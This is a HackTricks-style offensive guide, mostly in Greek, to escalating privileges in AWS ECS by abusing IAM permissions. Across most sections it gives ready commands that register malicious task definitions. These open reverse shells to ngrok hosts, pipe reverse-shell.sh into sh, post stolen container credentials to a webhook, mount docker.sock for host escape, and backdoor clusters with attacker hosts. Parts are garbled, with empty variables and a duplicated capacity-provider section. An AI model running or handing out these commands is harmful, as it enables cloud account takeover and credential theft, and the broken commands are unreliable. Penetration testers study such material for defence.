# AWS - ECS Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## ECS

Περισσότερες **πληροφορίες για το ECS** στο:

{{#ref}}
../../aws-services/aws-ecs-enum.md
{{#endref}}

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:RunTask`

Ένας επιτιθέμενος που εκμεταλλεύεται την άδεια `iam:PassRole`, `ecs:RegisterTaskDefinition` και `ecs:RunTask` στο ECS μπορεί να **δημιουργήσει ένα νέο task definition** με ένα **κακόβουλο container** που κλέβει τα διαπιστευτήρια μεταδεδομένων και να **το εκτελέσει**.

{{#tabs }}
{{#tab name="Reverse Shell" }}
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

# Run task definition
aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
{{#endtab }}

{{#tab name="Webhook" }}

Δημιουργήστε ένα webhook με έναν ιστότοπο όπως το webhook.site
```bash

# Create file container-definition.json
[
{
"name": "exfil_creds",
"image": "python:latest",
"entryPoint": ["sh", "-c"],
"command": [
"CREDS=$(curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}); curl -X POST -H 'Content-Type: application/json' -d \"$CREDS\" https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890"
]
}
]

# Run task definition, uploading the .json file
aws ecs register-task-definition \
--family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 \
--memory 512 \
--requires-compatibilities FARGATE \
--container-definitions file://container-definition.json

# Check the webhook for a response

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1

```
{{#endtab }}

{{#endtabs }}

**Πιθανός αντίκτυπος:** Άμεσο privesc σε διαφορετικό ECS role.

### `iam:PassRole`,`ecs:RunTask`
Ένας επιτιθέμενος που έχει `iam:PassRole` και `ecs:RunTask` δικαιώματα μπορεί να ξεκινήσει ένα νέο ECS task με τροποποιημένες τιμές για **execution role**, **task role** και το **command** του container. Η εντολή CLI `ecs run-task` περιλαμβάνει την παράμετρο `--overrides` που επιτρέπει την αλλαγή σε runtime των `executionRoleArn`, `taskRoleArn` και του `command` του container χωρίς να πειράξει το task definition.

Οι συγκεκριμένοι IAM ρόλοι για `taskRoleArn` και `executionRoleArn` πρέπει να trust/allow να αναληφθούν από το `ecs-tasks.amazonaws.com` στην trust policy τους.

Επίσης, ο επιτιθέμενος χρειάζεται να γνωρίζει:
- ECS cluster name
- VPC Subnet
- Security group (If no security group is specified the default one will be used)
- Task Definition Name and revision
- Name of the Container
```bash
aws ecs run-task \
--cluster <cluster-name> \
--launch-type FARGATE \
--network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" \
--task-definition <task-definition:revision> \
--overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": <container-name>,
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
Στο παραπάνω απόσπασμα κώδικα ένας επιτιθέμενος αντικαθιστά μόνο την τιμή του `taskRoleArn`. Ωστόσο, ο επιτιθέμενος πρέπει να έχει την άδεια `iam:PassRole` για το `taskRoleArn` που καθορίζεται στην εντολή και για το `executionRoleArn` που καθορίζεται στον ορισμό του task ώστε η επίθεση να συμβεί.

Εάν ο IAM ρόλος που ο επιτιθέμενος μπορεί να περάσει έχει αρκετά προνόμια για να κάνει pull το ECR image και να ξεκινήσει το ECS task (ecr:BatchCheckLayerAvailability, ecr:GetDownloadUrlForLayer, ecr:BatchGetImage, ecr:GetAuthorizationToken) τότε ο επιτιθέμενος μπορεί να καθορίσει τον ίδιο IAM ρόλο και για το `executionRoleArn` και για το `taskRoleArn` στην εντολή `ecs run-task`.
```sh
aws ecs run-task --cluster <cluster-name> --launch-type FARGATE --network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" --task-definition <task-definition:revision> --overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"executionRoleArn":"arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": "<container-name>",
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
**Potential Impact:** Άμεση privesc σε οποιονδήποτε ECS task role.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`

Όπως και στο προηγούμενο παράδειγμα, ένας επιτιθέμενος που καταχράται τα δικαιώματα **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`** στο ECS μπορεί να **δημιουργήσει ένα νέο task definition** με ένα **κακόβουλο container** που κλέβει τα διαπιστευτήρια μεταδεδομένων και να το **τρέξει**.\
Ωστόσο, σε αυτή την περίπτωση, απαιτείται μια container instance για να εκτελεστεί το κακόβουλο task definition.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

aws ecs start-task --task-definition iam_exfiltration \
--container-instances <instance_id>

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**Potential Impact:** Άμεση privesc σε οποιονδήποτε ECS ρόλο.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, (`ecs:UpdateService|ecs:CreateService)` 

Όπως και στο προηγούμενο παράδειγμα, ένας επιτιθέμενος που καταχράται τα **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:UpdateService`** ή **`ecs:CreateService`** permissions στο ECS μπορεί να **generate a new task definition** με ένα **malicious container** που κλέβει τα metadata credentials και να **run it by creating a new service with at least 1 task running.**
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn  "$ECS_ROLE_ARN" \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"

# Run the task creating a service
aws ecs create-service --service-name exfiltration \
--task-definition iam_exfiltration \
--desired-count 1 \
--cluster "$CLUSTER_ARN" \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"

# Run the task updating a service
aws ecs update-service --cluster <CLUSTER NAME> \
--service <SERVICE NAME> \
--task-definition <NEW TASK DEFINITION NAME>
```
**Potential Impact:** Άμεσο privesc σε οποιοδήποτε ECS role.

### `iam:PassRole`, (`ecs:UpdateService|ecs:CreateService)`

Στην πραγματικότητα, μόνο με αυτές τις άδειες είναι δυνατόν να χρησιμοποιήσεις overrides για να εκτελέσεις αυθαίρετες εντολές σε ένα container με οποιοδήποτε role, με κάτι σαν:
```bash
aws ecs run-task \
--task-definition "<task-name>" \
--overrides '{"taskRoleArn":"<role-arn>", "containerOverrides":[{"name":"<container-name-in-task>","command":["/bin/bash","-c","curl https://reverse-shell.sh/6.tcp.eu.ngrok.io:18499 | sh"]}]}' \
--cluster <cluster-name> \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"DISABLED\", \"subnets\":[\"<subnet-name>\"]}}"
```
**Πιθανός Αντίκτυπος:** Άμεσο privesc σε οποιονδήποτε ρόλο ECS.

### `ecs:RegisterTaskDefinition`, **`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Αυτό το σενάριο είναι παρόμοιο με τα προηγούμενα αλλά **χωρίς** την άδεια **`iam:PassRole`**.\
Αυτό παραμένει ενδιαφέρον γιατί αν μπορείτε να τρέξετε έναν αυθαίρετο container, ακόμα κι αν δεν έχει ρόλο, θα μπορούσατε να **τρέξετε ένα privileged container για να διαφύγετε** στον node και να **κλέψετε τον EC2 IAM role** και τους **ρόλους των άλλων ECS containers** που τρέχουν στον node.\
Μπορείτε ακόμα και να **αναγκάσετε άλλες εργασίες να τρέξουν μέσα στο EC2 instance** που παραβιάζετε για να κλέψετε τα διαπιστευτήριά τους (όπως συζητείται στην [**Privesc to node section**](aws-ecs-post-exploitation/README.md#privesc-to-node)).

> [!WARNING]
> Αυτή η επίθεση είναι δυνατή μόνο αν το **ECS cluster χρησιμοποιεί EC2** instances και όχι Fargate.
```bash
printf '[
{
"name":"exfil_creds",
"image":"python:latest",
"entryPoint":["sh", "-c"],
"command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
"mountPoints": [
{
"readOnly": false,
"containerPath": "/var/run/docker.sock",
"sourceVolume": "docker-socket"
}
]
}
]' > /tmp/task.json

printf '[
{
"name": "docker-socket",
"host": {
"sourcePath": "/var/run/docker.sock"
}
}
]' > /tmp/volumes.json


aws ecs register-task-definition --family iam_exfiltration \
--cpu 256 --memory 512 \
--requires-compatibilities '["EC2"]' \
--container-definitions file:///tmp/task.json \
--volumes file:///tmp/volumes.json


aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster \
--launch-type EC2

# You will need to do 'apt update' and 'apt install docker.io' to install docker in the rev shell
```
### `ecs:ExecuteCommand`, `ecs:DescribeTasks,`**`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Ένας επιτιθέμενος με τα **`ecs:ExecuteCommand`, `ecs:DescribeTasks`** μπορεί να **execute commands** μέσα σε ένα τρέχον container και να εξάγει το IAM role που είναι συνδεδεμένο σε αυτό (χρειάζεσαι τα describe permissions επειδή είναι απαραίτητα για να τρέξεις `aws ecs execute-command`).\ Ωστόσο, για να γίνει αυτό, το container instance πρέπει να τρέχει τον **ExecuteCommand agent** (ο οποίος από προεπιλογή δεν τρέχει).

Therefore, the attacker cloud try to:

- **Try to run a command** in every running container
```bash
# List enableExecuteCommand on each task
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
echo "Cluster $cluster"
for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
echo "  Task $task"
# If true, it's your lucky day
aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
done
done

# Execute a shell in a container
aws ecs execute-command --interactive \
--command "sh" \
--cluster "$CLUSTER_ARN" \
--task "$TASK_ARN"
```
- Αν έχει **`ecs:RunTask`**, τρέξτε ένα task με `aws ecs run-task --enable-execute-command [...]`
- Αν έχει **`ecs:StartTask`**, τρέξτε ένα task με `aws ecs start-task --enable-execute-command [...]`
- Αν έχει **`ecs:CreateService`**, δημιουργήστε μια service με `aws ecs create-service --enable-execute-command [...]`
- Αν έχει **`ecs:UpdateService`**, ενημερώστε μια service με `aws ecs update-service --enable-execute-command [...]`

Μπορείτε να βρείτε **παραδείγματα αυτών των επιλογών** στις **προηγούμενες ECS privesc sections**.

**Πιθανός αντίκτυπος:** Privesc σε διαφορετικό ρόλο συνδεδεμένο με containers.

### `ssm:StartSession`

Δείτε στη **ssm privesc page** πώς μπορείτε να καταχραστείτε αυτή την άδεια για να **privesc to ECS**:

{{#ref}}
../aws-ssm-privesc/README.md
{{#endref}}

### `iam:PassRole`, `ec2:RunInstances`

Δείτε στη **ec2 privesc page** πώς μπορείτε να καταχραστείτε αυτές τις άδειες για να **privesc to ECS**:

{{#ref}}
../aws-ec2-privesc/README.md
{{#endref}}

### `ecs:RegisterContainerInstance`, `ecs:DeregisterContainerInstance`, `ecs:StartTask`, `iam:PassRole`

Ένας επιτιθέμενος με αυτές τις άδειες θα μπορούσε ενδεχομένως να εγγράψει ένα EC2 instance σε ένα ECS cluster και να τρέξει tasks σε αυτό. Αυτό θα μπορούσε να επιτρέψει στον επιτιθέμενο να εκτελέσει αυθαίρετο κώδικα στο πλαίσιο των ECS tasks.

- TODO: Είναι δυνατόν να εγγραφεί ένα instance από διαφορετικό AWS account ώστε τα tasks να τρέχουν σε μηχανές ελεγχόμενες από τον επιτιθέμενο;;

### `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets`

> [!NOTE]
> TODO: Δοκιμάστε αυτό

Ένας επιτιθέμενος με τις άδειες `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, και `ecs:DescribeTaskSets` μπορεί να **δημιουργήσει ένα κακόβουλο task set για μια υπάρχουσα ECS service και να ενημερώσει το primary task set**. Αυτό επιτρέπει στον επιτιθέμενο να **εκτελέσει αυθαίρετο κώδικα μέσα στην υπηρεσία**.
```bash
# Register a task definition with a reverse shell
echo '{
"family": "malicious-task",
"containerDefinitions": [
{
"name": "malicious-container",
"image": "alpine",
"command": [
"sh",
"-c",
"apk add --update curl && curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | sh"
]
}
]
}' > malicious-task-definition.json

aws ecs register-task-definition --cli-input-json file://malicious-task-definition.json

# Create a malicious task set for the existing service
aws ecs create-task-set --cluster existing-cluster --service existing-service --task-definition malicious-task --network-configuration "awsvpcConfiguration={subnets=[subnet-0e2b3f6c],securityGroups=[sg-0f9a6a76],assignPublicIp=ENABLED}"

# Update the primary task set for the service
aws ecs update-service-primary-task-set --cluster existing-cluster --service existing-service --primary-task-set arn:aws:ecs:region:123456789012:task-set/existing-cluster/existing-service/malicious-task-set-id
```
**Ενδεχόμενος Αντίκτυπος**: Εκτέλεση arbitrary code στην επηρεασμένη υπηρεσία, ενδεχομένως επηρεάζοντας τη λειτουργικότητά της ή exfiltrating ευαίσθητα δεδομένα.

## Αναφορές

- [https://ruse.tech/blogs/ecs-attack-methods](https://ruse.tech/blogs/ecs-attack-methods)







### Hijack ECS Scheduling via Malicious Capacity Provider (EC2 ASG takeover)

Ένας attacker με δικαιώματα για διαχείριση των ECS capacity providers και ενημέρωση services μπορεί να δημιουργήσει ένα EC2 Auto Scaling Group που ελέγχει, να το τυλίξει σε έναν ECS Capacity Provider, να το συσχετίσει με το target cluster και να μεταφέρει ένα victim service ώστε να χρησιμοποιεί αυτόν τον provider. Τα tasks θα προγραμματιστούν σε attacker-controlled EC2 instances, επιτρέποντας OS-level πρόσβαση για να εξετάσει containers και να κλέψει task role credentials.

Commands (us-east-1):

- Προαπαιτούμενα



- Create Launch Template for ECS agent to join target cluster



- Create Auto Scaling Group



- Create Capacity Provider from the ASG



- Associate the Capacity Provider to the cluster (optionally as default)



- Migrate a service to your provider



- Verify tasks land on attacker instances



- Optional: Από το EC2 node, docker exec στα target containers και ανάγνωση http://169.254.170.2 για να αποκτήσετε τα task role credentials.

- Cleanup



**Potential Impact:** Attacker-controlled EC2 nodes λαμβάνουν victim tasks, επιτρέποντας OS-level πρόσβαση στα containers και κλοπή των task IAM role credentials.


<details>
<summary>Βήμα προς βήμα εντολές (αντιγραφή/επικόλληση)</summary>
<pre>
export AWS_DEFAULT_REGION=us-east-1
CLUSTER=arn:aws:ecs:us-east-1:947247140022:cluster/ht-victim-cluster
# Instance profile for ECS nodes
aws iam create-role --role-name ht-ecs-instance-role --assume-role-policy-document Version:2012-10-17 || true
aws iam attach-role-policy --role-name ht-ecs-instance-role --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role || true
aws iam create-instance-profile --instance-profile-name ht-ecs-instance-profile || true
aws iam add-role-to-instance-profile --instance-profile-name ht-ecs-instance-profile --role-name ht-ecs-instance-role || true

VPC=vpc-18e6ac62
SUBNETS=

AMI=ami-0b570770164588ab4
USERDATA=IyEvYmluL2Jhc2gKZWNobyBFQ1NfQ0xVU1RFUj0gPj4gL2V0Yy9lY3MvZWNzLmNvbmZpZwo=
LT_ID=

ASG_ARN=

CP_NAME=htcp-8797
aws ecs create-capacity-provider --name  --auto-scaling-group-provider "autoScalingGroupArn=,managedScaling={status=ENABLED,targetCapacity=100},managedTerminationProtection=DISABLED"
aws ecs put-cluster-capacity-providers --cluster "" --capacity-providers  --default-capacity-provider-strategy capacityProvider=,weight=1

SVC=
# Task definition must be EC2-compatible (not Fargate-only)
aws ecs update-service --cluster "" --service "" --capacity-provider-strategy capacityProvider=,weight=1 --force-new-deployment

TASK=
CI=
aws ecs describe-container-instances --cluster "" --container-instances "" --query containerInstances[0].ec2InstanceId --output text
</pre>
</details>

### Backdoor compute in-cluster via ECS Anywhere EXTERNAL registration

Abuse ECS Anywhere για να καταχωρήσετε ένα attacker-controlled host ως EXTERNAL container instance σε ένα victim ECS cluster και να τρέξετε tasks σε αυτόν τον host χρησιμοποιώντας privileged task και execution roles. Αυτό παρέχει OS-level έλεγχο του πού τρέχουν τα tasks (το δικό σας μηχάνημα) και επιτρέπει credential/data theft από tasks και προσαρτημένους volumes χωρίς να πειράξετε capacity providers ή ASGs.

- Required perms (example minimal):
- ecs:CreateCluster (optional), ecs:RegisterTaskDefinition, ecs:StartTask or ecs:RunTask
- ssm:CreateActivation, ssm:DeregisterManagedInstance, ssm:DeleteActivation
- iam:CreateRole, iam:AttachRolePolicy, iam:DeleteRole, iam:PassRole (for the ECS Anywhere instance role and task/execution roles)
- logs:CreateLogGroup/Stream, logs:PutLogEvents (if using awslogs)

- Impact: Run arbitrary containers with chosen taskRoleArn on attacker host; exfiltrate task-role credentials from 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI; access any volumes mounted by tasks; stealthier than manipulating capacity providers/ASGs.

Steps

1) Create/identify cluster (us-east-1)
```bash
aws ecs create-cluster --cluster-name ht-ecs-anywhere
```
2) Δημιουργία ECS Anywhere role και ενεργοποίηση SSM (για on-prem/EXTERNAL instance)
```bash
aws iam create-role --role-name ecsAnywhereRole \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ssm.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ecsAnywhereRole --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
aws iam attach-role-policy --role-name ecsAnywhereRole --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role
ACTJSON=$(aws ssm create-activation --iam-role ecsAnywhereRole)
ACT_ID=$(echo $ACTJSON | jq -r .ActivationId); ACT_CODE=$(echo $ACTJSON | jq -r .ActivationCode)
```
3) Provision attacker host και κάντε αυτόματη εγγραφή του ως EXTERNAL (παράδειγμα: μικρό AL2 EC2 ως “on‑prem”)

<details>
<summary>user-data.sh</summary>
```bash
#!/bin/bash
set -euxo pipefail
amazon-linux-extras enable docker || true
yum install -y docker curl jq
systemctl enable --now docker
curl -fsSL -o /root/ecs-anywhere-install.sh "https://amazon-ecs-agent.s3.amazonaws.com/ecs-anywhere-install-latest.sh"
chmod +x /root/ecs-anywhere-install.sh
/root/ecs-anywhere-install.sh --cluster ht-ecs-anywhere --activation-id ${ACT_ID} --activation-code ${ACT_CODE} --region us-east-1
```
</details>
```bash
AMI=$(aws ssm get-parameters --names /aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-gp2 --query 'Parameters[0].Value' --output text)
IID=$(aws ec2 run-instances --image-id $AMI --instance-type t3.micro \
--user-data file://user-data.sh --query 'Instances[0].InstanceId' --output text)
aws ec2 wait instance-status-ok --instance-ids $IID
```
4) Επαλήθευση ότι η EXTERNAL container instance εντάχθηκε
```bash
aws ecs list-container-instances --cluster ht-ecs-anywhere
aws ecs describe-container-instances --cluster ht-ecs-anywhere \
--container-instances <ci-arn> --query 'containerInstances[0].[ec2InstanceId,attributes]'
# ec2InstanceId will be mi-XXXXXXXX (SSM managed instance id) and attributes include ecs.capability.external
```
5) Δημιούργησε task/execution roles, καταχώρισε EXTERNAL task definition και τρέξε το στον attacker host
```bash
# roles
aws iam create-role --role-name ht-ecs-task-exec \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs-tasks.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ht-ecs-task-exec --policy-arn arn:aws:iam::aws:policy/service-role/AmazonECSTaskExecutionRolePolicy
aws iam create-role --role-name ht-ecs-task-role \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs-tasks.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
# attach any privileges you want to abuse to this task role

# task def (EXTERNAL launch)
cat > td-external.json << 'JSON'
{
"family": "ht-external",
"requiresCompatibilities": [ "EXTERNAL" ],
"networkMode": "bridge",
"memory": "256",
"cpu": "128",
"executionRoleArn": "arn:aws:iam::<account-id>:role/ht-ecs-task-exec",
"taskRoleArn": "arn:aws:iam::<account-id>:role/ht-ecs-task-role",
"containerDefinitions": [
{"name":"steal","image":"public.ecr.aws/amazonlinux/amazonlinux:latest",
"entryPoint":["/bin/sh","-c"],
"command":["REL=\$(printenv AWS_CONTAINER_CREDENTIALS_RELATIVE_URI); echo CREDS:; curl -s http://169.254.170.2\$REL; sleep 600"],
"memory": 128,
"logConfiguration":{"logDriver":"awslogs","options":{"awslogs-region":"us-east-1","awslogs-group":"/ht/ecs/anywhere","awslogs-stream-prefix":"steal"}}
}
]
}
JSON
aws logs create-log-group --log-group-name /ht/ecs/anywhere || true
aws ecs register-task-definition --cli-input-json file://td-external.json
CI=$(aws ecs list-container-instances --cluster ht-ecs-anywhere --query 'containerInstanceArns[0]' --output text)
aws ecs start-task --cluster ht-ecs-anywhere --task-definition ht-external \
--container-instances $CI
```
6) Από εδώ ελέγχετε το host που τρέχει τα tasks. Μπορείτε να διαβάσετε task logs (if awslogs) ή να εκτελέσετε απευθείας exec στο host για να exfiltrate credentials/data από τα tasks σας.



#### Παράδειγμα εντολής (δείκτες κράτησης θέσης)




### Hijack ECS Scheduling via Malicious Capacity Provider (EC2 ASG takeover)

Ένας επιτιθέμενος με δικαιώματα για να διαχειρίζεται ECS capacity providers και να ενημερώνει services μπορεί να δημιουργήσει ένα EC2 Auto Scaling Group που ελέγχει, να το ενσωματώσει σε έναν ECS Capacity Provider, να το συσχετίσει με το target cluster, και να μεταφέρει μια υπηρεσία θύματος ώστε να χρησιμοποιεί αυτόν τον provider. Τα Tasks θα προγραμματιστούν τότε σε EC2 instances που ελέγχονται από τον επιτιθέμενο, επιτρέποντας πρόσβαση σε επίπεδο OS για επιθεώρηση containers και κλοπή task role credentials.

Commands (us-east-1):

- Προαπαιτούμενα



- Δημιουργία Launch Template ώστε ο ECS agent να ενταχθεί στο target cluster



- Δημιουργία Auto Scaling Group



- Δημιουργία Capacity Provider από το ASG



- Συσχέτιση του Capacity Provider με το cluster (προαιρετικά ως default)



- Μεταφορά μιας service στον provider σας



- Επαλήθευση ότι τα tasks προσγειώνονται σε instances του επιτιθέμενου



- Προαιρετικό: Από τον EC2 node, docker exec μέσα στα target containers και διαβάστε http://169.254.170.2 για να αποκτήσετε τα task role credentials.

- Καθαρισμός



**Potential Impact:** EC2 nodes που ελέγχονται από τον επιτιθέμενο λαμβάνουν victim tasks, επιτρέποντας πρόσβαση σε επίπεδο OS στα containers και κλοπή των task IAM role credentials.
{{#include ../../../../banners/hacktricks-training.md}}
